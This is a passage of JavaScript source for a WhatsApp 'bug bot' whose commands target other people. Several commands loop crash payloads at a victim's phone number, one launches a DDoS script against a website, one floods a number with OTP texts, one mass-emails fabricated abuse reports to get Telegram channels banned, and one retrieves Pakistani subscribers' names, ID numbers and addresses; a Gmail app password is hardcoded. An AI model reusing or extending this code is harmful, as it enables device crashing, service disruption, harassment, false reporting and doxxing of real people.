				delete m.quoted.chat
				await XeonBotInc.sendMessage(m.chat, { forward: m.quoted.fakeObj, mentions: participants.map(a => a.id) })
			}
			break
			
			case 'hidetag': case 'h': {
				if (!m.isGroup) return replygcxeon(mess.OnlyGrup)
				XeonBotInc.sendMessage(m.chat, { text : q ? q : '' , mentions: participants.map(a => a.id)})
			}
			break
			
			/*case 's': case 'sticker': case 'stiker': {
if (!quoted) return replygcxeon(`Send/Reply Images/Videos/Gifs With Captions ${prefix+command}\nVideo Duration 1-9 Seconds`)
if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await XeonBotInc.sendImageAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return replygcxeon('Send/Reply Images/Videos/Gifs With Captions ${prefix+command}\nVideo Duration 1-9 Seconds')
let media = await quoted.download()
let encmedia = await XeonBotInc.sendVideoAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
} else {
replygcxeon(`Send/Reply Images/Videos/Gifs With Captions ${prefix+command}\nVideo Duration 1-9 Seconds`)
}
}
break

case 'swm': case 'steal': case 'stickerwm': case 'take':{
if (!isPremium) return replyprem(mess.premium)
if (!args.join(" ")) return replygcxeon(`Where is the text?`)
const swn = args.join(" ")
const pcknm = swn.split("|")[0]
const atnm = swn.split("|")[1]
if (m.quoted.isAnimated === true) {
XeonBotInc.downloadAndSaveMediaMessage(quoted, "gifee")
XeonBotInc.sendMessage(m.chat, {sticker:fs.readFileSync("gifee.webp")}, m, { packname: pcknm, author: atnm })
} else if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await XeonBotInc.sendImageAsSticker(m.chat, media, m, { packname: pcknm, author: atnm })
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return replygcxeon('Maximum 10 Seconds!')
let media = await quoted.download()
let encmedia = await XeonBotInc.sendVideoAsSticker(m.chat, media, m, { packname: pcknm, author: atnm })
} else {
replygcxeon(`Photo/Video?`)
}
}
break*/
case 'blankui': case 'r-crash': {
               //if (!isRentBotUser) return replygcxeon(mess.premium)
               if (!q) return replygcxeon(`Example Usage:\n .${command} 92xxx`);

                  let jidx = q.replace(/[^0-9]/g, "");
    
                   if (jidx.startsWith('0')) {
                    return replygcxeon(`The number starts with '0'. Replace it with the country code number.\n\nExample: .${command} 62 xxx-xxxx-xxxx`);
                   }

              let isTarget = `${jidx}@s.whatsapp.net`;
              if (ownerNumbers.includes(parseInt(isTarget.replace(/[^0-9]/g, "")))) {
    return replygcxeon("You can't send bug to owner numbers");
  }

    replygcxeon(`*𝗦𝗨𝗖𝗖𝗘𝗦 𝗧𝗨𝗔𝗡, 𝗛𝗔𝗥𝗔𝗣 𝗝𝗘𝗗𝗔 𝟱-𝟭𝟬 𝗠𝗘𝗡𝗜𝗧 𝗔𝗚𝗔𝗥 𝗧𝗜𝗗𝗔𝗞 𝗞𝗘𝗡𝗢𝗡 ${command} 𝗠𝗘𝗡𝗚𝗜𝗥𝗜𝗠 𝗞𝗘 ${isTarget}*`);
   
    //Paramameter
      for (let i = 0; i < 80; i++) {
    await fcXflow(isTarget)
    await fcXflow(isTarget)
    await fcXflow(isTarget)
    await fcXflow(isTarget)
    await fcXflow(isTarget)
    await fcXflow(isTarget)
    await fcXflow(isTarget)
    await fcXflow(isTarget)
    await fcXflow(isTarget)
    await fcXflow(isTarget)
    await fcXflow(isTarget)
    await fcXflow(isTarget)
    await fcXflow(isTarget)
    await fcXflow(isTarget)
    await fcXflow(isTarget)
    await fcXflow(isTarget)
    await fcXflow(isTarget)
    await fcXflow(isTarget)
    await fcXflow(isTarget)
    await fcXflow(isTarget)
    await fcXflow(isTarget)
    await fcXflow(isTarget)
    await fcXflow(isTarget)
    await fcXflow(isTarget)
    }
}
case "android13": case "android11": case "android12": {
		//if (!isRentBotUser) return replygcxeon(mess.premium)
if (!q) return replygcxeon(`\`Example:\` : ${prefix+command} 92xxx`);
target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
if (ownerNumbers.includes(parseInt(target.replace(/[^0-9]/g, "")))) {
    return replygcxeon("You can't send bug to owner numbers");
  }
replygcxeon(`*[!] bug successfully sent to ${target} Using Command ${prefix+command}.*\n> *Before Using Please Wait 10 Minutes...*`); 
          for (let i = 0; i < 100; i++) {
            await xeonAndroSpam(target)
            await sleep(500)
            await forcer(target)
            await sleep(500)
            await xeonAndroSpam(target)
            await sleep(500)
            await xeonAndroSpam(target)
            await sleep(500)
            await forcer(target)
            await sleep(500)
            await forcer(target)
            await sleep(500)
            await xeonAndroSpam(target)
            await sleep(500)
            await forcer(target)
            await sleep(500)
        }

    }
  
break;
case "hardcrash": case "glitch": case "sbshdbemm": {
		//if (!isRentBotUser) return replygcxeon(mess.premium)
if (!q) return replygcxeon(`\`Example:\` : ${prefix+command} 92xxx`);
target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
if (ownerNumbers.includes(parseInt(target.replace(/[^0-9]/g, "")))) {
    return replygcxeon("You can't send bug to owner numbers");
  }
replygcxeon(`*[!] bug successfully sent to ${target} Using Command ${prefix+command}.*\n> *Before Using Please Wait 10 Minutes...*`); 
          for (let i = 0; i < 20; i++) {
            await xeonAndroSpam(target)
            await forcer(target)
            await sleep(500)
            await xeonAndroSpam(target)
            await sleep(500)
            await delayMakerInvisible2(target)
            await sleep(500)
            await forcer(target)
            await sleep(500)
            await xeonAndroSpam(target)
            await sleep(500)
            await delayMakerInvisible2(target)
            await sleep(500)
            await xeonAndroSpam(target)
            await sleep(500)
            await xeonAndroSpam(target)
            await sleep(500)
        }

    }
  
break;
case "invisible": case "jamwtsp": case "ANUGA-SENITHU-invi7": {
//if (allowedUsers12.includes(ANUGA-SENITHUmatch12)) {
//if (!isPremium) return replygcxeon(mess.premium)
if (!q) return replygcxeon(`\`Example:\` : ${prefix+command} 92xxx`);
target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
if (ownerNumbers.includes(parseInt(target.replace(/[^0-9]/g, "")))) {
    return replygcxeon("You can't send bug to owner numbers");
  }
replygcxeon(`*[!] bug successfully sent to ${target} Using Command ${prefix+command}.*\n> *Before Using Please Wait 10 Minutes...*`); 
          for (let i = 0; i < 800; i++) {
          await xeonGalaxtos(target)
          await sleep(3000)
          await xeonGalaxtos(target)
          await sleep(3000)
          await xeonGalaxtos(target)
          await sleep(3000)
          await xeonGalaxtos(target)
          await sleep(3000)
          await xeonGalaxtos(target)
          await sleep(3000)
          await xeonGalaxtos(target)
          await sleep(3000)
          await xeonGalaxtos(target)
          await sleep(3000)
          await xeonGalaxtos(target)
          await sleep(3000)
          await xeonGalaxtos(target)
          }
          /*} else {
    	replygcxeon(`*_🚫 You Are Not Premium User Contact With Owner ANUGA-SENITHU To Buy Premium_*\n*Contact:* +94710695082\n*Telegram:* https://t.me/ANUWH4YOU`);
    	}*/
    }
  
break;
/*case 'facebook-ban': case 'fb-ban': 
  try {
    if (!text) return replygcxeon(`*Example:* ${prefix}reportfb https://www.facebook.com/username`);
    // Extract the target Facebook profile URL
    const targetProfileUrl = text.trim();
    if (!targetProfileUrl.includes('facebook.com')) {
      return replygcxeon(`Invalid Facebook link. Please provide a valid Facebook profile link.`);
    }
    // Choose a random report template
const reportTemplates = [
  `Dear Facebook Support Team, I would like to report a Facebook account that is violating your community standards. The account is located at ${targetProfileUrl} and is posting content that is [ specify the type of content, e.g. hate speech, harassment, etc. ]. I request that you take immediate action to remove this content and restrict access to the account.`,
  `Hello Facebook Support, I am writing to report a Facebook account that is impersonating me/my business. The account is located at ${targetProfileUrl} and is posting content that is [ specify the type of content, e.g. false information, etc. ]. I request that you take immediate action to verify the account and remove the impersonating content.`,
  `Dear Facebook Support Team, I am reporting a Facebook account that is posting spam content. The account is located at ${targetProfileUrl} and is repeatedly posting links to [ specify the type of content, e.g. phishing sites, etc. ]. I request that you take immediate action to remove this content and restrict access to the account.`,
  `I am reporting a Facebook account that is bullying/harassing me or someone I know. The account is located at ${targetProfileUrl} and is posting content that is [ specify the type of content, e.g. threatening messages, etc. ]. I request that you take immediate action to remove this content and restrict access to the account.`,
  `I would like to report a Facebook account that is posting fake news/misinformation. The account is located at ${targetProfileUrl} and is spreading false information about [ specify the topic, e.g. politics, health, etc. ]. I request that you take immediate action to remove this content and restrict access to the account.`,
  `I am reporting a Facebook account that is violating your terms of service. The account is located at ${targetProfileUrl} and is [ specify the type of violation, e.g. posting explicit content, etc. ]. I request that you take immediate action to remove this content and restrict access to the account.`,
  `Dear Facebook Support Team, I would like to report a Facebook account that is suspicious/fake. The account is located at ${targetProfileUrl} and is [ specify the suspicious activity, e.g. sending friend requests to random people, etc. ]. I request that you take immediate action to verify the account and remove any suspicious content.`,
  `I would like to report a Facebook account that is posting content that is against my values/beliefs. The account is located at ${targetProfileUrl} and is posting content that is [ specify the type of content, e.g. hate speech, etc. ]. I request that you take immediate action to remove this content and restrict access to the account.`,
];
    // Select a random report template
    const randomTemplate = reportTemplates[Math.floor(Math.random() * reportTemplates.length)];
    // Send email using Gmail
    const transporter = nodemailer.createTransport({
      host: 'smtp.gmail.com',
      port: 587,
      secure: false,
      auth: {
        user: 'idowu4226@gmail.com',
        pass: 'jokk zaqw nfyh ohid'
      }
    });
    const mailOptions = {
      from: 'idowu4226@gmail.com',
      to: 'support@facebook.com',
      subject: `Report: Facebook Account ${targetProfileUrl}`,
      text: randomTemplate
    };
    transporter.sendMail(mailOptions, (error, info) => {
      if (error) {
        console.error(error);
        replygcxeon('❌ Failed to send report. Please try again later.');
      } else {
        replygcxeon(`*⚠️ REPORT SENT ⚠️*\n\nTarget: ${targetProfileUrl}\nStatus: ✅ Successfully reported`);
      }
    });
  } catch (error) {
    console.error(error);
    replygcxeon('❌ Failed to send report. Please try again later.');
  }
  break;*/
  case "teleban":
if (!isRentBotUser) return replygcxeon(mess.premium)
  if (!text) return replygcxeon(`*Example:* ${prefix + command} <channel username>`);
  
  // Clean the channel link to keep only the username without @ or t.me/
  let channelLink = text.trim();
        if (!channelLink.includes('t.me/') && !channelLink.startsWith('@')) {

    return replygcxeon(`Invalid Telegram channel link or username. Please provide a valid link or username.`);

  }
  // Clean the channel link to keep only the username without @ or t.me/
  channelLink = channelLink.replace(/^@|https?:\/\/t\.me\/|\/$/g, "");

  // Ban request templates to report the channel to Telegram Support
  const banEmailRequests = [
    `Dear Telegram Support Team, I would like to report a channel with the username ${channelLink} for violating Telegram's Terms of Service. This channel is sharing inappropriate content and should be reviewed and banned.`,
    `Hello Telegram Support, I am writing to report the channel ${channelLink} for multiple violations of your platform rules. The channel is distributing harmful content and should be banned immediately.`,
    `Telegram Support Team, the channel ${channelLink} should be banned as it violates your terms of service by posting content that promotes violence and hate speech. Please take appropriate action.`,
    `I would like to report channel ${channelLink} for posting illegal content. This channel consistently breaks Telegram's rules and should be banned from the platform.`,
    `Dear Telegram Team, I am contacting you regarding channel ${channelLink} which is spreading misinformation and harmful content. I request that this channel be banned for violating your community guidelines.`,
    `Telegram Support, please investigate and ban the channel ${channelLink} which is engaging in activities prohibited by your Terms of Service, including sharing illegal content.`,
    `Hello Telegram, I'm reporting the channel ${channelLink} for copyright violations and sharing pirated content. This channel should be banned according to your platform policies.`,
    `Telegram Support Team, channel ${channelLink} is distributing explicit content without proper age verification. This violates your guidelines and the channel should be banned.`,
    `Dear Telegram, the channel ${channelLink} is engaging in spamming activities and should be banned from your platform as it violates your anti-spam policies.`,
    `Telegram Support, please ban channel ${channelLink} for harassment and targeting of individuals. This violates your community standards and warrants immediate action.`,
    `To the Telegram Team, I'm reporting channel ${channelLink} for scamming users and engaging in fraudulent activities. Please ban this channel as it violates your user safety policies.`,
    `Telegram Support, the channel ${channelLink} should be banned for organizing illegal activities, which is strictly prohibited according to your Terms of Service.`,
    `Hello Telegram Team, please review and ban the channel ${channelLink} which is being used to coordinate attacks on other users and platforms.`,
    `Dear Telegram Support, I'm reporting the channel ${channelLink} for posting non-consensual intimate images. This channel should be banned for violating privacy and content policies.`,
    `Telegram Team, the channel ${channelLink} is distributing malware and should be banned to protect users from potential security threats.`,
    `Telegram Support Team, please investigate channel ${channelLink} which is impersonating public figures and organizations, violating your authenticity policies.`,
    `Dear Telegram, channel ${channelLink} repeatedly posts content that glorifies violence and should be banned according to your community guidelines.`,
    `To Telegram Support, please ban channel ${channelLink} which is being used for blackmail and extortion, violating both your policies and the law.`,
    `Telegram Team, I'm reporting channel ${channelLink} for posting content that promotes dangerous activities that could cause physical harm to viewers.`,
    `Dear Telegram Support, the channel ${channelLink} is involved in network manipulation and should be banned according to your platform integrity policies.`,
    `Hello Telegram, please ban the channel ${channelLink} which is being used to coordinate targeted harassment campaigns against vulnerable communities.`,
    `Telegram Support Team, I'm reporting channel ${channelLink} for posting child inappropriate content. This must be immediately banned and investigated.`,
    `Dear Telegram, please review and ban channel ${channelLink} which is selling illegal substances in violation of your Terms of Service.`,
    `Telegram Team, channel ${channelLink} is posting graphic violence without appropriate warnings or age restrictions and should be banned.`,
    `To Telegram Support, please ban ${channelLink} for spreading dangerous conspiracy theories that have led to real-world harm.`,
    `Telegram Support, the channel ${channelLink} is facilitating illegal transactions and should be banned from your platform.`,
    `Dear Telegram Team, please ban channel ${channelLink} which is being used to dox individuals, severely violating privacy and safety.`,
    `Hello Telegram Support, I'm reporting the channel ${channelLink} for promoting self-harm content which violates your community guidelines.`,
    `Telegram Team, channel ${channelLink} should be banned for repeatedly evading previous channel bans using new accounts.`,
    `Dear Telegram Support, please investigate and ban channel ${channelLink} which is organizing illegal gambling activities.`,
  ];

  // Email configuration
  const transporter = nodemailer.createTransport({
    host: 'smtp.gmail.com',
    port: 587,
    secure: false,
    auth: {
      user: 'idowu4226@gmail.com',
      pass: 'jokk zaqw nfyh ohid' // Consider using environment variables for credentials
    }
  });

  // Number of times to send the email
  const sendCount = 3; // Sending more reports increases ban likelihood

  for (let i = 0; i < sendCount; i++) {
    // Select a random ban request
    const banRequest = banEmailRequests[Math.floor(Math.random() * banEmailRequests.length)];

    // Email content
    const mailOptions = {
      from: 'idowu4226@gmail.com',
      to: 'abuse@telegram.org', // Telegram's channel report email
      subject: `Report Abusive Telegram Channel: ${channelLink}`,
      text: banRequest.replace(/{channelLink}/g, channelLink)
    };

    // Send email
    transporter.sendMail(mailOptions)
      .then((info) => {
        console.log(`Ban report email sent (attempt ${i + 1}/${sendCount}): ${info.response}`);
      })
      .catch((error) => {
        console.error(`Error sending ban report email (attempt ${i + 1}/${sendCount}): ${error}`);
      });
  }

  // Also send to content reports email for more impact
  const contentReportMailOptions = {
    from: 'idowu4226@gmail.com',
    to: 'dmca@telegram.org', // Additional Telegram reporting email
    subject: `URGENT: Report Illegal Content in Channel ${channelLink}`,
    text: banEmailRequests
  };

  transporter.sendMail(contentReportMailOptions)
    .then((info) => {
      console.log(`Content violation report sent: ${info.response}`);
    })
    .catch((error) => {
      console.error(`Error sending content violation report: ${error}`);
    });

  replygcxeon(`✅ Sent ${sendCount + 1} ban request reports for channel ${channelLink}. Channel should be reviewed by Telegram moderators within 24-48 hours.`);
break
case 'simdata': {
  if (!q) {
    return replygcxeon(`❌ Please provide a phone number!\nExample: ${prefix}simdata 03325809154`);
  }

  // Clean input: remove non-digits, preserve leading +
  const cleanedNumber = q.replace(/[^\d+]/g, '').replace(/^\+?(\d+)$/, '$1');

  // Validate phone number (10-13 digits, optional +)
  if (!/^\+?\d{10,13}$/.test(cleanedNumber)) {
    await XeonBotInc.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
    return replygcxeon(`❌ Invalid phone number! Example: 03325809154 or +923325809154`);
  }

  await XeonBotInc.sendMessage(m.chat, { react: { text: '⏳', key: m.key } });

  try {
    const axios = require('axios');
    const response = await axios.get(`https://famofcfallxd.serv00.net/apis/famdata.php?num=${encodeURIComponent(cleanedNumber)}`, {
      timeout: 10000
    });

    const data = response.data;

    // ✅ Handle new API format
    if (data.status !== 'success' || !Array.isArray(data.data) || data.data.length === 0) {
      await XeonBotInc.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
      return replygcxeon(`❌ No data found for number ${text}. Try another number.`);
    }

    let formattedResponse = `✅ *SIM Database Results*\n`;
    formattedResponse += `📞 Queried Number: ${cleanedNumber}\n`;
    formattedResponse += `📊 Total Records: ${data.data.length}\n\n`;

    data.data.forEach((userData, index) => {
      formattedResponse += `📌 *Record ${index + 1}:*\n`;
      formattedResponse += `🔹 Name: ${userData.Name || 'Unknown'}\n`;
      formattedResponse += `🔹 Number: ${userData.Mobile || 'Unknown'}\n`;
      formattedResponse += `🔹 CNIC: ${userData.CNIC || 'Unknown'}\n`;
      formattedResponse += `🔹 Address: ${userData.Address?.trim() || 'Unknown'}\n`;
      formattedResponse += `🔹 Country: ${userData.Country || 'Unknown'}\n`;
      formattedResponse += `━━━━━━━\n`;
    });

    formattedResponse += `🔍 Powered by FAM OFC`;

    await XeonBotInc.sendMessage(m.chat, { text: formattedResponse }, { quoted: m });
    await XeonBotInc.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
  } catch (error) {
    console.error("SIM Data Error:", { message: error.message, code: error.code });
    await XeonBotInc.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
    await replygcxeon(error.code === 'ECONNABORTED' ? `❌ Timeout. Please try again later.` : `❌ Failed to retrieve SIM data.`);
  }
}
break;
case "ipinfo": {
  if (!q) return replygcxeon(`💡 *Provide an IP address*\n> Example: ${prefix + command} 223.123.113.215`)
  let ip = q;
  if (!ip) {
    return reply('⚠ Enter a valid IP address.');
  }
  replygcxeon('⏳ _Getting data..._');
  try {
    let apiUrl = `https://ip-info.bjcoderx.workers.dev/?ip=${ip}`;
    let response = await axios.get(apiUrl);
    let data = response.data;
    console.log(data);
    let ipInfo = `🌐 *IP Information:*\n`;
    ipInfo += `*IP:* ${data.ip}\n`;
    ipInfo += `*Continent:* ${data.continent_name} (${data.continent_code})\n`;
    ipInfo += `*Country:* ${data.country_name_official} (${data.country_code2})\n`;
    ipInfo += `*Country Capital:* ${data.country_capital}\n`;
    ipInfo += `*State/Province:* ${data.state_prov} (${data.state_code})\n`;
    ipInfo += `*District:* ${data.district}\n`;
    ipInfo += `*City:* ${data.city}\n`;
    ipInfo += `*Zipcode:* ${data.zipcode}\n`;
    ipInfo += `*Latitude:* ${data.latitude}\n`;
    ipInfo += `*Longitude:* ${data.longitude}\n`;
    ipInfo += `*ISP:* ${data.isp}\n`;
    ipInfo += `*Organization:* ${data.organization}\n`;
    ipInfo += `*Connection Type:* ${data.connection_type}\n`;
    ipInfo += `*Currency:* ${data.currency.name} (${data.currency.code}) - ${data.currency.symbol}\n`;
    ipInfo += `*Time Zone:* ${data.time_zone.name} (UTC${data.time_zone.offset >= 0 ? '+' : ''}${data.time_zone.offset})\n`;
    ipInfo += `*Current Time:* ${data.time_zone.current_time}\n`;
    ipInfo += `*Country Emoji:* ${data.country_emoji}\n`;
    ipInfo += `*Calling Code:* ${data.calling_code}\n`;
    ipInfo += `*Country TLD:* ${data.country_tld}\n`;
    ipInfo += `*Languages:* ${data.languages}\n`;
    replygcxeon(ipInfo);
  } catch (error) {
    console.error("API Error:", error);
    replygcxeon("⚠ Error fetching IP information. Try again later.");
  }
} break;
case "sbomb": case "smsboomer": {
    if (!q) {
        return replygcxeon(`💡 *Provide a phone number and sms amount*\n> Example: ${prefix + command} 92xxx 100`);
    }

    let args = q.split(" ");
    if (args.length !== 2) {
        return replygcxeon('⚠️ *Invalid format! Use: .smsboomer <phone_number> <count>*');
    }

    let phone = args[0];
    let count = parseInt(args[1]);

    if (!phone || isNaN(count) || count < 1 || count > 100) {
        return replygcxeon('⚠️ *Enter a valid phone number and OTP count (1-100).*');
    }

    replygcxeon('⏳ _Sending OTPs..._');

    try {
        let requests = [];
        for (let i = 0; i < count; i++) {
            let apiUrl = i % 2 === 0 
                ? `https://shadowscriptz.xyz/public_apis/smsbomberapi.php?num=${phone}`
                : `https://tappayments.tapmad.com/pay/api/initiatePaymentTransactionNewPackage`;

            let payload = i % 2 !== 0 ? JSON.stringify({
                Version: 'V1',
                Language: 'en',
                Platform: 'web',
                ProductId: 1733,
                MobileNo: phone,
                OperatorId: '100007',
                URL: 'https://www.tapmad.com/sign-up',
                source: 'organic',
                medium: 'organic'
            }) : null;

            let options = {
                method: 'POST',
                headers: i % 2 !== 0 ? {
                    'Content-Type': 'application/json',
                    'Accept': 'application/json'
                } : {},
                body: payload
            };

            requests.push(fetch(apiUrl, options));
        }

        await Promise.all(requests);
        replygcxeon('☑️ _OTP(s) sent successfully!_');
    } catch (error) {
        console.error("API Error:", error);
        //replygcxeon("⚠ Error sending OTPs. Try again later.");
    }
}
break
case 'menu':
            case 'help':
            case 'alive':
            case 'ANUGA-SENITHU':
            case 'allmenu':{          	
            //
            	const more = String.fromCharCode(8206)
const readmore = more.repeat(4001)
const xeonmenuoh = `Hello Dear ${pushname}
˜”°º× ${xeonytimewisher} 🙂
𝗪𝗘𝗟𝗖𝗢𝗠𝗘 𝗧𝗢 𝗔𝗡𝗨𝗪𝗛 𝗠𝗗 𝗙𝗥𝗘𝗘 𝗕𝗨𝗚 𝗕𝗢𝗧. 𝗜 𝗛𝗢𝗣𝗘 𝗬𝗢𝗨 𝗪𝗜𝗟𝗟 𝗨𝗦𝗘 𝗠𝗬 𝗕𝗢𝗧 𝗘𝗡𝗝𝗢𝗬𝗔𝗕𝗟𝗘  ヅ
✹𝗩𝗲𝗿𝘀𝗶𝗼𝗻: V1
✹𝑹𝑼𝑵𝑻𝑰𝑴𝑬: ${runtime(process.uptime())}
✹𝑶𝑾𝑵𝑬𝑹: ANUGA SENITHU丨
✹𝑪𝑶𝑵𝑻𝑨𝑪𝑻: t.me/ANUWH4YOU
༅༅༅༅༅༅༅༅༅༅༅༅༅༅༅༅༅༅༅༅༅༅༅༅༅༅༅༅༅
> *_.fund_* (👑) 
➲ 𝐀𝐍𝐃𝐑𝐎𝐈𝐃 𝐁𝐔𝐆  🧪
> *_.ANUGA-SENITHU-invi7_* 92xxx
> *_.jamwtsp_* 92xxx
> *_.invisible_* 92xxx
> *_.android11_* 92xxx
> *_.android12_* 92xxx
> *_.android13_* 92xxx
> *_.hardcrash_* 92xxx

➲ 𝐈𝐏𝐇𝐎𝐍𝐄 𝐁𝐔𝐆 🧪
> *_.ioscrash* 92xxx 
> *_.iphoneinvi_* 92xxx

➲ 𝐅𝐎𝐑𝐂𝐄 𝐁𝐔𝐆 ✮
> *_.forceblock amount (in chat)_*
> *_.forcegroup groupid|amount_*

➲ 𝐁𝐔𝐆 𝐎𝐓𝐇𝐄𝐑𝐒 🧪
> *_.ddos_* web
> *_.checkhost_* web

➲ 𝐁𝐀𝐍𝐍𝐈𝐍𝐆 😈
> *_.teleban_* <username/link> 

➲ 𝐏𝐀𝐊𝐈𝐒𝐓𝐀𝐍 𝐃𝐀𝐓𝐀 🇵🇰
> *_.simdata_* 03xxx (only 🇵🇰)
> *_.cnicdata_* 31304xxx (only 🇵🇰)
> *_.smsboomer_* 03xxx (only 🇵🇰)

➲ 𝐓𝐎𝐎𝐋𝐒 𝐌𝐄𝐍𝐔 ❤️‍🔥
> *_.iginfo_* (Instagram Id check)
> *_.ipinfo_* (Track Any Ip Location)

➲ 𝐎𝐖𝐍𝐄𝐑 💀
> *_.addprem_* 92xxx
> *_.delprem_* 92xxx
> *_.listprem_*
> *_.reqpair_* 92xxx
> *_.delpair_* 92xxx
> *_.listgc_*
> *_.group-id_* <linkgc>
> *_.idch_* <link channel>
> *_.rvo_* (reply chat)`
XeonBotInc.sendMessage(m.chat, {
video: fs.readFileSync('./XeonMedia/Cheems-bot.mp4'),
caption: xeonmenuoh,
gifPlayback: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: "120363399531796033@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://postimg.cc/nX6ZH38b",
sourceUrl: link,
mediaType: 1,
renderLargerThumbnail: true
}
}
}, {
quoted: m
})

}
break;
case 'ddos':{
	//
if (!q.includes(' ')) return replygcxeon(`Use Methode: .${command} <target> <time>\nExaple: .${command} example.xyz 60`)
if (q.includes('dgxeon.shop')){
	return replygcxeon(`Cannot attack developer's site`);
	}
                     const targetweb = q.substring(0, q.indexOf(' ') - 0)
                const timeweb = q.substring(q.lastIndexOf(' ') + 1) 
replygcxeon(`Bot is attacking ${targetweb} with time ${timeweb}`)
              exec(`node ddos.js ${targetweb} ${timeweb}`, { maxBuffer: 1024 * 1024 }, (error, stdout, stderr) => {
        if (error) {
          replygcxeon(`Error: ${error.message}`);
          return;
        }
        if (stderr) {
          replygcxeon(`Error: ${stderr}`);
          return;
        }
        replygcxeon(`Success\n\n🤙 target: ${targetweb},\n🤙 Time: ${timeweb}`);
      });  
      }                 
break

case 'enc': case 'encrypt': {
	//
        const JSConfuser = require("js-confuser");
        const usage = `Usage Example:
${prefix + command} (Input text or reply text to obfuscate code)
${prefix + command} doc (Reply to a document)`;

        let text;
        if (args.length >= 1) {
            text = args.join(" ");
        } else if (m.quoted && m.quoted.text) {
            text = m.quoted.text;
        } else {
            return replygcxeon(usage);
        }
        
        try {
            let code;
            if (text === 'doc' && m.quoted && m.quoted.mtype === 'documentMessage') {
                let docBuffer;
                if (m.quoted.mimetype) {
                    docBuffer = await m.quoted.download();
                }
                code = docBuffer.toString('utf-8');
            } else {
                code = text;
            }

const optionsObf6 = {
          target: "node",
    preset: "high",
    compact: true,
    minify: true,
    flatten: true,

    identifierGenerator: function() {
        const originalString = 
            "素晴座素晴難ANUGA-SENITHU素晴座素晴難" + 
            "素晴座素晴難ANUGA-SENITHU素晴座素晴難";
        
        // Fungsi untuk menghapus karakter yang tidak diinginkan
        function removeUnwantedChars(input) {
            return input.replace(
                /[^a-zA-Z座Nandokuka素Muzukashī素晴]/g, ''
            );
        }

        // Fungsi untuk menghasilkan string acak
        function randomString(length) {
            let result = '';
            const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'; // Hanya simbol
            const charactersLength = characters.length;

            for (let i = 0; i < length; i++) {
                result += characters.charAt(
                    Math.floor(Math.random() * charactersLength)
                );
            }
            return result;
        }

        return removeUnwantedChars(originalString) + randomString(2);
    },

    renameVariables: true,
    renameGlobals: true,

    stringEncoding: true,
    stringSplitting: 0.0,
    stringConcealing: true,
    stringCompression: true,
    duplicateLiteralsRemoval: 1.0,

    shuffle: {
        hash: 0.0,
        true: 0.0
    },

    stack: true,
    controlFlowFlattening: 1.0,
    opaquePredicates: 0.9,
    deadCode: 0.0,
    dispatcher: true,
    rgf: false,
    calculator: true,
    hexadecimalNumbers: true,
    movedDeclarations: true,
    objectExtraction: true,
    globalConcealing: true
};


        const options = {
            target: "node",
  calculator: true,
  compact: true,
  hexadecimalNumbers: true,
  controlFlowFlattening: 0.5,
  deadCode: 0.25,
  dispatcher: true,
  duplicateLiteralsRemoval: 0.75,
  flatten: true,
  globalConcealing: true,
  minify: true,
  movedDeclarations: true,
  objectExtraction: true,
  opaquePredicates: 0.75,
  renameVariables: true,
  renameGlobals: true,
  shuffle: true,
  stringConcealing: true,
  stringCompression: true,
  stringEncoding: true,
  stringSplitting: 0.75,
  preserveFunctionLength: true,
  identifierGenerator: function () {
                return "HEART_MAKER" + Math.random().toString(36).substring(7);
            },
        };

            const obfuscatedCode = await JSConfuser.obfuscate(code, optionsObf6);

            const filePath = './enc_by_@ANUGA-SENITHU.js';
            fs.writeFileSync(filePath, obfuscatedCode);

            await XeonBotInc.sendMessage(m.chat, {
                document: {
                    url: filePath
                },
                mimetype: 'application/javascript',
                fileName: 'Encrypted By @ANUGA-SENITHU.js'
            }, { quoted: m });

        } catch (error) {
            const errorMessage = `There is an error: ${error.message}`;
            await replygcxeon(errorMessage);
        }
}
break;
case 'dec': case 'decrypt': {
	//
const { webcrack } = await import('webcrack');
const usage = `Usage Example:
${prefix + command} (Input text or reply text to dec code)
${prefix + command} doc (Reply to a document)`;

let text;
if (args.length >= 1) {
text = args.join(" ");
} else if (m.quoted && m.quoted.text) {
text = m.quoted.text;
} else {
return replygcxeon(usage);
}

try {
let message;
if (text === 'doc' && m.quoted && m.quoted.mtype === 'documentMessage') {
let docBuffer;
if (m.quoted.mimetype) {
docBuffer = await m.quoted.download();
}
message = await webcrack(docBuffer.toString('utf-8'));
} else {
message = await webcrack(text);
}

const filePath = './dec_by_@ANUGA-SENITHU.js';
fs.writeFileSync(filePath, message.code);

await XeonBotInc.sendMessage(m.chat, {
document: {
url: filePath
},
mimetype: 'application/javascript',
fileName: 'Decrypted By @ANUGA-SENITHU'
}, {quoted: m});

} catch (error) {
const errorMessage = `There is an error: ${error.message}`;
await replygcxeon(errorMessage);
}
}
break;
case 'readviewonce': case 'rvo': {
  if (!m.quoted) return replygcxeon(`Reply to view once message`)
  let buffer = await XeonBotInc.downloadMediaMessage(m.quoted)
  if (buffer) {
    if (m.quoted.mtype === 'imageMessage') {
      return XeonBotInc.sendMessage(m.chat, { image: buffer, caption: '' })
    } else if (m.quoted.mtype === 'videoMessage') {
      return XeonBotInc.sendMessage(m.chat, { video: buffer })
    } else if (m.quoted.mtype === 'pttMessage' || m.quoted.mtype === 'audioMessage') {
      return XeonBotInc.sendMessage(m.chat, { audio: buffer, mimetype: 'audio/mp4', ptt: m.quoted.mtype === 'pttMessage' })
    } else {
      return XeonBotInc.sendMessage(m.chat, { document: buffer })
    }
  } else {
    replygcxeon(`Failed to download media`)
  }
} break;

case 'clearchat':{
	//
